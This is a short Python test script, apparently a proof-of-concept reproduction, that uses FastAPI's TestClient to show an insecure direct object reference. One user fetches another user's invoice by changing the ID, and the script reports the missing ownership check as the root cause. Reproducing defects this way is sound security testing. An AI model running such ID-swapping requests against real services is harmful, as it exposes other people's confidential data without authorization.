import sys
from fastapi.testclient import TestClient
from app import app

def run_reproduction():
    client = TestClient(app)
    print("--- [ProofForge Reproduction Test: IDOR / Missing Authorization] ---")
    print("Scenario: Attacker (user_bob) queries confidential invoice #101 owned by user_alice.")
    
    # User Bob requests Alice's invoice
    response = client.get("/invoices/101", headers={"x-user-id": "user_bob"})
    
    print(f"Executed Request: GET /invoices/101 with Header x-user-id: user_bob")
    print(f"HTTP Response Code: {response.status_code}")
    print(f"HTTP Response Body: {response.json()}")

    # Expected secure behavior: 403 Forbidden or 404 Not Found
    # Observed vulnerable behavior: 200 OK returning Alice's confidential invoice
    if response.status_code == 200 and response.json().get("owner_id") == "user_alice":
        print("\n[VULNERABILITY REPRODUCED SUCCESSFULLY]")
        print("Defect Evidence:")
        print("1. Endpoint returned HTTP 200 OK to an unauthorized tenant.")
        print("2. Confirmed cross-tenant data leak: user_bob obtained invoice owned by user_alice.")
        print("3. Root cause: Endpoint lacks `if invoice['owner_id'] != current_user: raise 403` check.")
        sys.exit(0)
    else:
        print("\n[REPRODUCTION FAILED: Endpoint properly enforced authorization]")
        sys.exit(1)

if __name__ == "__main__":
    run_reproduction()
